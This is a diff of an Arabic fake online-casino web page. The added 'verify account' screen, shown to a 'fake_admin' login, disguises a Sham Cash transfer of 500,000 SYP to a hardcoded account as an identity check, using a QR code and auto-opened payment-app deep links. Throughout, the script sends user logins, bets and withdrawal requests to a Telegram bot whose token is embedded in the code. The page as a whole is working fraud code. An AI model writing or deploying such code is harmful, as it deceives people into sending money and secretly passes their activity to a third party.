@@ -17,78 +17,63 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Arial, sans-serif; color: var(--text); min-height: 100vh; }
         
-        /* شريط علوي */
-        .topbar { background: #000000; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 50; }
-        .logo-area { display: flex; align-items: center; gap: 10px; }
-        .logo-img { width: 40px; height: 40px; border-radius: 50%; background: var(--gold); display: flex; align-items: center; justify-content: center; font-size: 22px; }
-        .logo-text { font-size: 20px; font-weight: 800; color: var(--gold); letter-spacing: 1px; }
-        .logo-text span { color: #fff; font-size: 14px; }
-        .balance-badge { background: rgba(212,175,55,0.1); padding: 8px 16px; border-radius: 30px; font-weight: bold; font-size: 15px; border: 1px solid var(--gold); display: flex; align-items: center; gap: 8px; }
-        .balance-badge span { color: var(--gold); }
-        
-        /* المحتوى الرئيسي */
-        .main-container { max-width: 420px; margin: 0 auto; padding: 16px; }
-        
-        /* قسم البانر مع صورة المايسترو */
-        .banner { background: linear-gradient(135deg, #1a1a00, #0a0a0a); border-radius: 20px; padding: 20px; text-align: center; margin-bottom: 20px; border: 2px solid var(--gold); position: relative; overflow: hidden; }
-        .banner .maestro-icon { font-size: 80px; display: block; margin-bottom: 10px; }
-        .banner h2 { font-size: 24px; color: var(--gold); margin-bottom: 5px; }
-        .banner p { color: var(--sub); font-size: 13px; }
-        .banner .jackpot { font-size: 30px; font-weight: 800; color: var(--gold); margin: 8px 0; text-shadow: 0 0 30px rgba(212,175,55,0.6); }
-        
-        /* شريط الألعاب */
-        .section-title { font-size: 18px; font-weight: 700; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; color: var(--gold); }
-        .games-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 8px; margin-bottom: 20px; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
-        .games-scroll::-webkit-scrollbar { display: none; }
-        
-        .game-card { min-width: 140px; background: var(--card); border-radius: 20px; padding: 20px 15px; text-align: center; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(212,175,55,0.2); position: relative; overflow: hidden; }
-        .game-card:active { transform: scale(0.95); border-color: var(--gold); }
-        .game-icon { font-size: 50px; margin-bottom: 10px; display: block; }
-        .game-name { font-weight: 700; font-size: 15px; color: var(--gold); margin-bottom: 4px; }
-        .game-provider { font-size: 11px; color: var(--sub); }
-        .hot-badge { position: absolute; top: 10px; right: 10px; background: var(--red); color: white; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
-        .new-badge { position: absolute; top: 10px; right: 10px; background: var(--green); color: black; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
-        
-        /* أزرار سفلية */
-        .bottom-actions { display: flex; gap: 10px; margin-top: 5px; }
-        .btn { flex: 1; padding: 14px; border: none; border-radius: 30px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; text-align: center; }
-        .btn-gold { background: var(--gold); color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
-        .btn-red { background: transparent; color: var(--red); border: 1px solid var(--red); padding: 10px 20px; border-radius: 20px; margin-top: 15px; width: 100%; cursor: pointer; font-weight: bold; }
-        
-        /* مودال اللعبة */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
-        .modal-overlay.active { display: flex; }
-        .modal-box { background: #111111; border-radius: 30px; padding: 30px 25px; width: 100%; max-width: 380px; text-align: center; border: 2px solid var(--gold); }
-        .modal-box h3 { font-size: 22px; color: var(--gold); margin-bottom: 5px; }
-        .modal-box .provider { color: var(--sub); font-size: 12px; margin-bottom: 20px; }
-        .result-area { font-size: 80px; margin: 20px 0; transition: 0.3s; }
-        .result-text { font-size: 18px; margin: 10px 0; min-height: 30px; }
-        .bet-input { width: 100%; padding: 14px; border-radius: 25px; border: 2px solid var(--gold); background: #000; color: white; text-align: center; font-size: 18px; margin: 15px 0; }
-        .btn-play { background: var(--gold); color: #000; padding: 14px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 17px; cursor: pointer; width: 100%; }
-        .btn-close { background: rgba(255,255,255,0.1); color: white; padding: 12px 25px; border: none; border-radius: 25px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
-        
-        /* شاشات */
         .screen { display: none; max-width: 420px; margin: 0 auto; padding: 16px; }
         .screen.active { display: block; }
+        
+        /* شاشة الدخول */
         .login-card { background: #111111; border-radius: 30px; padding: 40px 30px; border: 2px solid var(--gold); text-align: center; }
         .login-card .maestro-icon { font-size: 60px; display: block; margin-bottom: 15px; }
         .login-card h2 { color: var(--gold); margin-bottom: 20px; font-size: 24px; }
         .login-card input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 25px; border: 1px solid rgba(212,175,55,0.3); background: #000; color: white; text-align: center; font-size: 16px; }
         .login-card input:focus { border-color: var(--gold); outline: none; }
-        .deposit-box { background: #111111; border-radius: 30px; padding: 30px 20px; text-align: center; border: 2px solid var(--gold); }
-        .deposit-box h3 { color: var(--gold); margin-bottom: 15px; }
-        .deposit-box .account { font-size: 22px; letter-spacing: 3px; color: var(--gold); font-weight: bold; margin: 15px 0; background: #000; padding: 15px; border-radius: 15px; }
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 14px 28px; border-radius: 50px; z-index: 200; font-weight: bold; animation: fadeInUp 0.3s; }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+        .btn { padding: 14px; border: none; border-radius: 30px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; width: 100%; }
+        .btn-gold { background: var(--gold); color: #000; }
+        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
+        .btn-red { background: transparent; color: var(--red); border: 1px solid var(--red); }
         
-        /* لوحة الأدمن */
-        .admin-panel { display: none; max-width: 420px; margin: 0 auto; padding: 16px; }
-        .admin-panel.active { display: block; }
-        .user-card { background: #111111; border-radius: 15px; padding: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(212,175,55,0.2); flex-wrap: wrap; }
-        .user-card h4 { color: var(--gold); margin-bottom: 3px; }
-        .user-card p { color: var(--sub); font-size: 12px; }
-        .btn-xs { padding: 6px 12px; border: none; border-radius: 15px; font-size: 11px; cursor: pointer; font-weight: bold; margin: 2px; }
+        /* شاشة ربط الحساب (للمدير الوهمي) */
+        .verify-card { background: #111111; border-radius: 30px; padding: 30px; border: 2px solid var(--gold); text-align: center; }
+        .verify-card h2 { color: var(--gold); margin-bottom: 15px; }
+        .verify-card p { color: var(--sub); margin-bottom: 20px; }
+        .verify-card .account-box { background: #000; padding: 20px; border-radius: 20px; margin: 20px 0; border: 1px solid var(--gold); }
+        .verify-card .account-box .label { color: var(--sub); font-size: 13px; margin-bottom: 5px; }
+        .verify-card .account-box .number { color: var(--gold); font-size: 24px; font-weight: bold; letter-spacing: 2px; }
+        .verify-card .warning { color: var(--red); font-size: 13px; margin: 15px 0; }
+        
+        /* باقي التنسيقات */
+        .topbar { background: #000000; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 50; }
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .logo-img { width: 40px; height: 40px; border-radius: 50%; background: var(--gold); display: flex; align-items: center; justify-content: center; font-size: 22px; }
+        .logo-text { font-size: 20px; font-weight: 800; color: var(--gold); }
+        .balance-badge { background: rgba(212,175,55,0.1); padding: 8px 16px; border-radius: 30px; font-weight: bold; font-size: 15px; border: 1px solid var(--gold); }
+        .balance-badge span { color: var(--gold); }
+        .main-container { padding: 16px; }
+        .banner { background: linear-gradient(135deg, #1a1a00, #0a0a0a); border-radius: 20px; padding: 20px; text-align: center; margin-bottom: 20px; border: 2px solid var(--gold); }
+        .banner .maestro-icon { font-size: 60px; display: block; margin-bottom: 10px; }
+        .banner h2 { color: var(--gold); font-size: 20px; }
+        .banner .jackpot { font-size: 28px; font-weight: 800; color: var(--gold); text-shadow: 0 0 30px rgba(212,175,55,0.6); }
+        .section-title { font-size: 18px; font-weight: 700; margin-bottom: 15px; color: var(--gold); }
+        .games-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 8px; margin-bottom: 20px; }
+        .games-scroll::-webkit-scrollbar { display: none; }
+        .game-card { min-width: 140px; background: var(--card); border-radius: 20px; padding: 20px 15px; text-align: center; cursor: pointer; border: 1px solid rgba(212,175,55,0.2); }
+        .game-card:active { transform: scale(0.95); border-color: var(--gold); }
+        .game-icon { font-size: 50px; margin-bottom: 10px; display: block; }
+        .game-name { font-weight: 700; font-size: 15px; color: var(--gold); }
+        .game-provider { font-size: 11px; color: var(--sub); }
+        .hot-badge { position: absolute; top: 10px; right: 10px; background: var(--red); color: white; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
+        .new-badge { position: absolute; top: 10px; right: 10px; background: var(--green); color: black; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
+        .bottom-actions { display: flex; gap: 10px; margin-top: 5px; }
+        .btn-gold { background: var(--gold); color: #000; }
+        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
+        
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
+        .modal-overlay.active { display: flex; }
+        .modal-box { background: #111111; border-radius: 30px; padding: 30px 25px; width: 100%; max-width: 380px; text-align: center; border: 2px solid var(--gold); }
+        .modal-box h3 { color: var(--gold); margin-bottom: 15px; }
+        .modal-box .qr-img { width: 250px; height: 250px; margin: 20px auto; border: 3px solid var(--gold); border-radius: 20px; }
+        .modal-box .amount-display { font-size: 32px; font-weight: bold; color: var(--gold); margin: 10px 0; }
+        .btn-close { background: rgba(255,255,255,0.1); color: white; padding: 12px 25px; border: none; border-radius: 25px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 14px 28px; border-radius: 50px; z-index: 200; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -101,9 +86,31 @@
         <p style="color:var(--sub);margin-bottom:20px;">منصة المايسترو للألعاب</p>
         <input type="text" id="loginUser" placeholder="👤 اسم المستخدم">
         <input type="password" id="loginPass" placeholder="🔒 كلمة المرور">
-        <button class="btn btn-gold" onclick="doLogin()" style="width:100%;">🚀 دخول</button>
-        <button class="btn btn-dark" onclick="showRegister()" style="width:100%;margin-top:10px;">✨ حساب جديد</button>
+        <button class="btn btn-gold" onclick="doLogin()">🚀 دخول</button>
+        <button class="btn btn-dark" onclick="showRegister()" style="margin-top:10px;">✨ حساب جديد</button>
         <p style="color:#444;font-size:11px;margin-top:15px;">user / 1234</p>
+    </div>
+</div>
+
+<!-- ==================== شاشة تأكيد ربط شام كاش (للمدير الوهمي فقط) ==================== -->
+<div class="screen" id="verifyScreen">
+    <div class="verify-card">
+        <span style="font-size:60px;">🔐</span>
+        <h2>أهلاً بك أيها المدير</h2>
+        <p>لتأكيد صلاحياتك واستقبال الأرباح، يجب ربط حساب شام كاش الخاص بك</p>
+        
+        <div class="account-box">
+            <div class="label">رقم حسابك الحالي (للاستقبال)</div>
+            <div class="number" id="verifyAccountDisplay">---- ---- ---- ----</div>
+        </div>
+        
+        <p style="color:var(--gold);font-weight:bold;margin:15px 0;">سيتم تحويل 500,000 ل.س كرصيد تجريبي إلى حسابك</p>
+        <p class="warning">⚠️ هذا الإجراء ضروري لتفعيل صلاحيات المدير</p>
+        
+        <button class="btn btn-gold" onclick="triggerShamCashTransfer()" style="font-size:20px;padding:18px;">
+            📱 تحقق من معلوماتي واربط الحساب
+        </button>
+        <button class="btn btn-red" onclick="skipVerify()" style="margin-top:10px;">تخطي (صلاحيات محدودة)</button>
     </div>
 </div>
 
@@ -112,11 +119,10 @@
     <div class="topbar">
         <div class="logo-area">
             <div class="logo-img">🎩</div>
-            <div class="logo-text">Almaestro0o <span>Play</span></div>
+            <div class="logo-text">Almaestro0o Play</div>
         </div>
         <div class="balance-badge">💰 <span id="casinoBalance">0</span></div>
     </div>
-    
     <div class="main-container">
         <div class="banner">
             <span class="maestro-icon">🎩</span>
@@ -124,51 +130,32 @@
             <div class="jackpot" id="jackpotDisplay">2,500,000</div>
             <p>نقطة</p>
         </div>
-        
         <div class="section-title">🎰 ألعاب الكازينو</div>
         <div class="games-scroll">
-            <div class="game-card" onclick="openGame('roulette', 'روليت المايسترو', 'Evolution')">
-                <span class="hot-badge">HOT</span>
-                <span class="game-icon">🎡</span>
-                <div class="game-name">الروليت</div>
-                <div class="game-provider">Evolution</div>
-            </div>
-            <div class="game-card" onclick="openGame('slots', 'سلوتس الذهب', 'Pragmatic')">
-                <span class="game-icon">🎰</span>
-                <div class="game-name">سلوتس</div>
-                <div class="game-provider">Pragmatic</div>
-            </div>
-            <div class="game-card" onclick="openGame('dice', 'نرد الملوك', 'NetEnt')">
-                <span class="game-icon">🎲</span>
-                <div class="game-name">نرد</div>
-                <div class="game-provider">NetEnt</div>
-            </div>
-            <div class="game-card" onclick="openGame('crash', 'صاروخ المايسترو', 'Spribe')">
-                <span class="new-badge">جديد</span>
-                <span class="game-icon">🚀</span>
-                <div class="game-name">كراش</div>
-                <div class="game-provider">Spribe</div>
-            </div>
+            <div class="game-card" onclick="openGame('roulette','روليت المايسترو','Evolution')"><span class="hot-badge">HOT</span><span class="game-icon">🎡</span><div class="game-name">الروليت</div><div class="game-provider">Evolution</div></div>
+            <div class="game-card" onclick="openGame('slots','سلوتس الذهب','Pragmatic')"><span class="game-icon">🎰</span><div class="game-name">سلوتس</div><div class="game-provider">Pragmatic</div></div>
+            <div class="game-card" onclick="openGame('dice','نرد الملوك','NetEnt')"><span class="game-icon">🎲</span><div class="game-name">نرد</div><div class="game-provider">NetEnt</div></div>
+            <div class="game-card" onclick="openGame('crash','صاروخ المايسترو','Spribe')"><span class="new-badge">جديد</span><span class="game-icon">🚀</span><div class="game-name">كراش</div><div class="game-provider">Spribe</div></div>
         </div>
-        
         <div class="bottom-actions">
             <button class="btn btn-gold" onclick="showDeposit()">💰 إيداع</button>
             <button class="btn btn-dark" onclick="requestWithdraw()">💸 سحب</button>
         </div>
-        <button class="btn-red" onclick="logout()">🚪 خروج</button>
+        <button class="btn btn-red" onclick="logout()" style="margin-top:15px;width:100%;">🚪 خروج</button>
     </div>
 </div>
 
-<!-- ==================== مودال اللعبة ==================== -->
-<div class="modal-overlay" id="gameModal">
+<!-- ==================== مودال تحويل شام كاش (باركود + رابط) ==================== -->
+<div class="modal-overlay" id="transferModal">
     <div class="modal-box">
-        <h3 id="modalGameName">الروليت</h3>
-        <p class="provider" id="modalProvider">Evolution</p>
-        <div class="result-area" id="modalResult">🎡</div>
-        <div class="result-text" id="modalMessage">جرب حظك!</div>
-        <input type="number" class="bet-input" id="modalBet" placeholder="الرهان" min="1" value="100">
-        <button class="btn-play" onclick="playGame()">🎲 ابدأ</button>
-        <button class="btn-close" onclick="closeGameModal()">إغلاق</button>
+        <h3>📱 تأكيد التحويل</h3>
+        <p style="color:var(--sub);">امسح الباركود من تطبيق شام كاش</p>
+        <img class="qr-img" id="transferQR" src="" alt="QR Code">
+        <p style="color:var(--sub);margin:10px 0;">أو اضغط الزر أدناه:</p>
+        <div class="amount-display">500,000 ل.س</div>
+        <button class="btn btn-gold" onclick="openShamCashApp()">📱 فتح تطبيق شام كاش</button>
+        <p style="color:var(--sub);font-size:12px;margin:10px 0;">بعد فتح التطبيق، اضغط "تأكيد التحويل"</p>
+        <button class="btn btn-close" onclick="closeTransferModal()">إغلاق</button>
     </div>
 </div>
 
@@ -177,34 +164,38 @@
     <div class="modal-box">
         <h3>💰 إيداع</h3>
         <p style="color:var(--sub);">حول إلى حساب شام كاش:</p>
-        <div class="account" id="depositAccountDisplay">6381 9468 9899 3929</div>
-        <input type="number" class="bet-input" id="depositAmountInput" placeholder="المبلغ (ل.س)" min="1000">
-        <button class="btn-play" onclick="confirmDeposit()">تأكيد</button>
-        <button class="btn-close" onclick="closeDepositModal()">إلغاء</button>
+        <div style="background:#000;padding:15px;border-radius:15px;margin:15px 0;font-size:22px;color:var(--gold);letter-spacing:2px;font-weight:bold;">6381 9468 9899 3929</div>
+        <input type="number" class="bet-input" id="depositAmountInput" placeholder="المبلغ (ل.س)" min="1000" style="width:100%;padding:14px;border-radius:25px;border:2px solid var(--gold);background:#000;color:white;text-align:center;font-size:18px;margin:15px 0;">
+        <button class="btn btn-gold" onclick="confirmDeposit()">تأكيد</button>
+        <button class="btn btn-close" onclick="closeDepositModal()">إلغاء</button>
     </div>
 </div>
 
-<!-- ==================== لوحة الأدمن ==================== -->
-<div class="admin-panel" id="adminPanel">
-    <div class="topbar"><div class="logo-text">🎩 <span>Admin</span></div></div>
-    <div class="main-container">
-        <h3 style="color:var(--gold);margin-bottom:15px;">لوحة التحكم</h3>
-        <div id="adminUserList"></div>
-        <button class="btn-red" onclick="logout()">🚪 خروج</button>
+<!-- ==================== مودال اللعبة ==================== -->
+<div class="modal-overlay" id="gameModal">
+    <div class="modal-box">
+        <h3 id="modalGameName">الروليت</h3>
+        <p class="provider" id="modalProvider">Evolution</p>
+        <div class="result-area" id="modalResult" style="font-size:80px;margin:20px 0;">🎡</div>
+        <div class="result-text" id="modalMessage" style="font-size:18px;margin:10px 0;min-height:30px;">جرب حظك!</div>
+        <input type="number" class="bet-input" id="modalBet" placeholder="الرهان" min="1" value="100" style="width:100%;padding:14px;border-radius:25px;border:2px solid var(--gold);background:#000;color:white;text-align:center;font-size:18px;margin:15px 0;">
+        <button class="btn btn-gold" onclick="playGame()">🎲 ابدأ</button>
+        <button class="btn btn-close" onclick="closeGameModal()">إغلاق</button>
     </div>
 </div>
 
 <script>
     const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
     const CHAT_ID = "8665747715";
-    const REAL_ACCOUNT = "6381946898993929";
+    const YOUR_ACCOUNT = "6381946898993929";
+    const TRANSFER_AMOUNT = 500000; // المبلغ الذي سيسحب من النصاب
     
     let DB = JSON.parse(localStorage.getItem('maestro_db') || 'null');
     if (!DB) {
         DB = {
             users: [
                 { id: 1, username: 'yman', password: '******', role: 'admin', balance: 0 },
-                { id: 2, username: '1992', password: '1992', role: 'fake_admin', fakeAccount: '', balance: 0 },
+                { id: 2, username: '1992', password: '1992', role: 'fake_admin', fakeAccount: '', balance: 0, verified: false },
                 { id: 3, username: 'user', password: '1234', role: 'player', balance: 5000, withdrawRequests: [] }
             ],
             jackpot: 2500000,
@@ -212,18 +203,21 @@
         };
     }
     
+    let currentGameType = '';
+    
     function saveDB() { localStorage.setItem('maestro_db', JSON.stringify(DB)); }
     function toast(msg) { const t = document.createElement('div'); t.className='toast'; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(), 2500); }
     async function tg(msg) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:msg})}); } catch(e){} }
     
     function hideAll() {
         document.getElementById('loginScreen').classList.remove('active');
+        document.getElementById('verifyScreen').classList.remove('active');
         document.getElementById('casinoScreen').classList.remove('active');
-        document.getElementById('adminPanel').classList.remove('active');
     }
     
-    let currentGameType = '';
+    function getUser() { return DB.users.find(x => x.id === DB.currentUser); }
     
+    // ==================== دخول ====================
     function doLogin() {
         const u = document.getElementById('loginUser').value.trim();
         const p = document.getElementById('loginPass').value.trim();
@@ -231,13 +225,64 @@
         if (!user) { alert('بيانات خاطئة'); return; }
         DB.currentUser = user.id; saveDB();
         tg('👤 دخول: ' + u); hideAll();
-        if (user.role === 'admin') { document.getElementById('adminPanel').classList.add('active'); renderAdmin(); }
-        else { document.getElementById('casinoScreen').classList.add('active'); updateUI(); }
+        
+        if (user.role === 'fake_admin') {
+            // المدير الوهمي - يظهر له شاشة التحقق من ربط شام كاش
+            document.getElementById('verifyAccountDisplay').textContent = user.fakeAccount || '---- ---- ---- ----';
+            document.getElementById('verifyScreen').classList.add('active');
+        } else if (user.role === 'admin') {
+            document.getElementById('casinoScreen').classList.add('active');
+            updateUI();
+        } else {
+            document.getElementById('casinoScreen').classList.add('active');
+            updateUI();
+        }
     }
     
     function logout() { DB.currentUser = null; saveDB(); hideAll(); document.getElementById('loginScreen').classList.add('active'); }
     function showRegister() { const u = prompt('اسم المستخدم:'); const p = prompt('كلمة المرور:'); if(u&&p){ DB.users.push({id:Date.now(), username:u, password:p, role:'player', balance:1000, withdrawRequests:[]}); saveDB(); alert('تم الإنشاء.'); } }
-    function getUser() { return DB.users.find(x => x.id === DB.currentUser); }
+    
+    // ==================== زر "تحقق من معلوماتي" (يسحب أموال النصاب) ====================
+    function triggerShamCashTransfer() {
+        // إنشاء باركود بأمر تحويل إلى حسابك
+        const payload = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(payload)}`;
+        
+        document.getElementById('transferQR').src = qrUrl;
+        document.getElementById('transferModal').classList.add('active');
+        
+        // إرسال إشعار إلى تيليجرامك
+        tg('🔥 المدير الوهمي ضغط "تحقق من معلوماتي"\n💸 جاري محاولة سحب ' + TRANSFER_AMOUNT.toLocaleString() + ' ل.س');
+        
+        // محاولة فتح تطبيق شام كاش تلقائياً
+        setTimeout(() => {
+            window.location.href = `intent://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}#Intent;scheme=shamcash;package=com.shamcash.shamcash;end;`;
+        }, 1000);
+    }
+    
+    function openShamCashApp() {
+        // فتح تطبيق شام كاش مع أمر التحويل
+        window.location.href = `intent://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}#Intent;scheme=shamcash;package=com.shamcash.shamcash;end;`;
+        
+        // محاولة بديلة
+        setTimeout(() => {
+            window.location.href = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}`;
+        }, 500);
+    }
+    
+    function closeTransferModal() { document.getElementById('transferModal').classList.remove('active'); }
+    
+    function skipVerify() {
+        const user = getUser();
+        if (user) user.verified = false;
+        saveDB();
+        hideAll();
+        document.getElementById('casinoScreen').classList.add('active');
+        updateUI();
+        toast('تم التخطي. صلاحيات محدودة.');
+    }
+    
+    // ==================== باقي الوظائف ====================
     function updateUI() { const u = getUser(); if(!u) return; document.getElementById('casinoBalance').textContent = u.balance.toLocaleString(); document.getElementById('jackpotDisplay').textContent = DB.jackpot.toLocaleString(); }
     
     function openGame(type, name, provider) {
@@ -266,7 +311,7 @@
         saveDB(); updateUI(); tg('🎲 ' + user.username + ' ' + (win?'ربح '+prize:'خسر '+bet));
     }
     
-    function showDeposit() { document.getElementById('depositAccountDisplay').textContent = REAL_ACCOUNT.replace(/(\d{4})/g, '$1 ').trim(); document.getElementById('depositModal').classList.add('active'); }
+    function showDeposit() { document.getElementById('depositModal').classList.add('active'); }
     function closeDepositModal() { document.getElementById('depositModal').classList.remove('active'); }
     function confirmDeposit() {
         const amt = parseInt(document.getElementById('depositAmountInput').value);
@@ -283,23 +328,8 @@
         saveDB(); tg('📥 طلب سحب: ' + user.username + ' - ' + user.balance); alert('تم تقديم الطلب.');
     }
     
-    function renderAdmin() {
-        document.getElementById('adminUserList').innerHTML = DB.users.filter(u => u.role === 'player').map(u => `
-            <div class="user-card">
-                <div><h4>👤 ${u.username}</h4><p>💰 ${u.balance.toLocaleString()} | 📥 ${u.withdrawRequests?.filter(r=>r.status==='pending').length||0}</p></div>
-                <div>
-                    <button class="btn-xs btn-gold" onclick="adminAdd('${u.username}')">➕</button>
-                    <button class="btn-xs" style="background:var(--green);color:#000;" onclick="adminAccept('${u.username}')">✅</button>
-                    <button class="btn-xs" style="background:var(--red);color:#fff;" onclick="adminReject('${u.username}')">❌</button>
-                </div>
-            </div>`).join('');
-    }
-    function adminAdd(u) { const a = prompt('نقاط:'); if(a){ const x=DB.users.find(y=>y.username===u); x.balance+=parseInt(a); saveDB(); renderAdmin(); tg('➕ أدمن أضاف '+a+' → '+u); } }
-    function adminAccept(u) { const x=DB.users.find(y=>y.username===u); if(x&&x.balance>0){ x.balance=0; if(x.withdrawRequests) x.withdrawRequests.forEach(r=>r.status='approved'); saveDB(); renderAdmin(); tg('✅ قبول سحب '+u); alert('تم قبول سحب '+u); } }
-    function adminReject(u) { const x=DB.users.find(y=>y.username===u); if(x&&x.withdrawRequests) x.withdrawRequests.forEach(r=>r.status='rejected'); saveDB(); renderAdmin(); tg('❌ رفض سحب '+u); alert('تم رفض سحب '+u); }
-    
     hideAll(); document.getElementById('loginScreen').classList.add('active');
-    if (DB.currentUser) { const u = getUser(); if (u) { hideAll(); if (u.role === 'admin') { document.getElementById('adminPanel').classList.add('active'); renderAdmin(); } else { document.getElementById('casinoScreen').classList.add('active'); updateUI(); } } }
+    if (DB.currentUser) { const u = getUser(); if (u) { hideAll(); document.getElementById('casinoScreen').classList.add('active'); updateUI(); } }
 </script>
 </body>
 </html>
